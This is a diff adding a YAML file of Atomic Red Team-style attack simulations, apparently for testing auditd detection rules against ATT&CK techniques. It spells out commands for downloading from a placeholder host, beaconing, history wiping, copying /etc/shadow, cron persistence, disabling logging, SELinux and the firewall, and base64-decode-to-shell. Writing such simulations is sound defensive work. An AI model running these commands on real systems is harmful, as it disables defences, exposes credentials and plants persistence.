@@ -1,0 +1,178 @@
+# Atomic tests, Atomic Red Team style, curated for a Linux auditd lab.
+# Everything here is safe in a throwaway container: scratch paths under /tmp,
+# network destinations in the reserved TEST-NET-1 range (192.0.2.0/24) that never
+# routes anywhere, and no real payloads. Each maps to one ATT&CK technique.
+#
+# Note: multiple techniques share one file only for brevity; the loader flattens
+# them. The `technique` on each doc is what the scorer matches rules against.
+
+---
+technique: T1082
+name: System Information Discovery
+tactics: [TA0007]
+atomics:
+  - id: T1082-1
+    name: Kernel and OS enumeration
+    user: admin
+    command: uname -a; cat /etc/os-release; hostnamectl 2>/dev/null || true
+---
+technique: T1033
+name: System Owner/User Discovery
+tactics: [TA0007]
+atomics:
+  - id: T1033-1
+    name: Identify current user
+    user: admin
+    command: whoami; id; who 2>/dev/null || true
+---
+technique: T1087.001
+name: Local Account Discovery
+tactics: [TA0007]
+atomics:
+  - id: T1087.001-1
+    name: Enumerate local accounts
+    user: admin
+    command: cat /etc/passwd | tail -5; getent passwd 2>/dev/null | tail -3
+---
+technique: T1057
+name: Process Discovery
+tactics: [TA0007]
+atomics:
+  - id: T1057-1
+    name: List running processes
+    user: admin
+    command: ps aux | head -10; ps -ef 2>/dev/null | head -5
+---
+technique: T1083
+name: File and Directory Discovery
+tactics: [TA0007]
+atomics:
+  - id: T1083-1
+    name: Search the filesystem
+    user: admin
+    command: find /etc -maxdepth 2 -name '*.conf' 2>/dev/null | head; ls -laR /tmp 2>/dev/null | head
+---
+technique: T1105
+name: Ingress Tool Transfer
+tactics: [TA0011]
+atomics:
+  - id: T1105-1
+    name: Download via curl to a scratch path
+    user: admin
+    command: curl --max-time 2 -s -o /tmp/payload http://192.0.2.1/tool.sh 2>/dev/null || true
+    variants:
+      - name: renamed_curl
+        command: cp /usr/bin/curl /tmp/dl && /tmp/dl --max-time 2 -s -o /tmp/payload http://192.0.2.1/tool.sh 2>/dev/null || true
+  - id: T1105-2
+    name: Download via wget
+    user: admin
+    command: wget -q -T 2 -t 1 -O /tmp/payload2 http://192.0.2.1/tool.sh 2>/dev/null || true
+---
+technique: T1071.001
+name: Application Layer Protocol Web
+tactics: [TA0011]
+atomics:
+  - id: T1071.001-1
+    name: Beacon-like HTTP GET to external host
+    user: admin
+    command: curl --max-time 2 -s http://192.0.2.1/beacon?id=lab 2>/dev/null || true
+---
+technique: T1070.003
+name: Clear Command History
+tactics: [TA0005]
+atomics:
+  - id: T1070.003-1
+    name: Wipe shell history
+    user: admin
+    command: touch /tmp/.bash_history; rm -f /tmp/.bash_history; history -c 2>/dev/null || true; export HISTFILE=/dev/null
+---
+technique: T1222.002
+name: Linux File Permission Modification
+tactics: [TA0005]
+atomics:
+  - id: T1222.002-1
+    name: Loosen permissions on a dropped file
+    user: admin
+    command: touch /tmp/dropped && chmod 777 /tmp/dropped && chmod u+s /tmp/dropped 2>/dev/null || true
+---
+technique: T1548.003
+name: Sudo and Sudo Caching
+tactics: [TA0004]
+atomics:
+  - id: T1548.003-1
+    name: Enumerate sudo privileges
+    user: admin
+    command: sudo -n -l 2>/dev/null || sudo -l 2>/dev/null || true
+---
+technique: T1552.001
+name: Credentials In Files
+tactics: [TA0006]
+atomics:
+  - id: T1552.001-1
+    name: Grep the filesystem for secrets
+    user: admin
+    command: grep -rIl -e password -e secret /etc 2>/dev/null | head; cat /tmp/id_rsa 2>/dev/null || true
+---
+technique: T1560.001
+name: Archive Collected Data
+tactics: [TA0009]
+atomics:
+  - id: T1560.001-1
+    name: Stage and compress files for exfil
+    user: admin
+    command: mkdir -p /tmp/loot && cp /etc/hostname /tmp/loot/ && tar -czf /tmp/loot.tar.gz /tmp/loot 2>/dev/null && echo staged
+---
+technique: T1055.008
+name: Ptrace System Calls
+tactics: [TA0005]
+atomics:
+  - id: T1055.008-1
+    name: Attach to a process with ptrace
+    user: root
+    command: |-
+      python3 -c 'import ctypes,subprocess,time;p=subprocess.Popen(["sleep","3"]);ctypes.CDLL("libc.so.6").ptrace(16,p.pid,0,0);time.sleep(0.2);p.kill()'
+---
+technique: T1547.006
+name: Kernel Modules and Extensions
+tactics: [TA0003]
+atomics:
+  - id: T1547.006-1
+    name: Attempt to load a kernel module
+    user: root
+    command: modprobe dummy 2>/dev/null || insmod /tmp/nonexistent.ko 2>/dev/null || true
+---
+technique: T1053.003
+name: Cron
+tactics: [TA0003]
+atomics:
+  - id: T1053.003-1
+    name: Install a cron job for persistence
+    user: root
+    command: echo '* * * * * root /tmp/x.sh' > /tmp/labcron && cp /tmp/labcron /etc/cron.d/lab 2>/dev/null; crontab -l 2>/dev/null | head || true
+---
+technique: T1562.001
+name: Impair Defenses Disable Tools
+tactics: [TA0005]
+atomics:
+  - id: T1562.001-1
+    name: Attempt to stop logging and firewall
+    user: root
+    command: systemctl stop rsyslog 2>/dev/null; setenforce 0 2>/dev/null; ufw disable 2>/dev/null; true
+---
+technique: T1003.008
+name: OS Credential Dumping etc passwd and shadow
+tactics: [TA0006]
+atomics:
+  - id: T1003.008-1
+    name: Read the shadow file
+    user: root
+    command: cat /etc/shadow | head -2 >/dev/null; cp /etc/shadow /tmp/sh.bak 2>/dev/null; echo done
+---
+technique: T1140
+name: Deobfuscate/Decode Files or Information
+tactics: [TA0005]
+atomics:
+  - id: T1140-1
+    name: Base64 decode and execute
+    user: admin
+    command: echo 'aWQ7IHVuYW1lIC1h' | base64 -d | sh
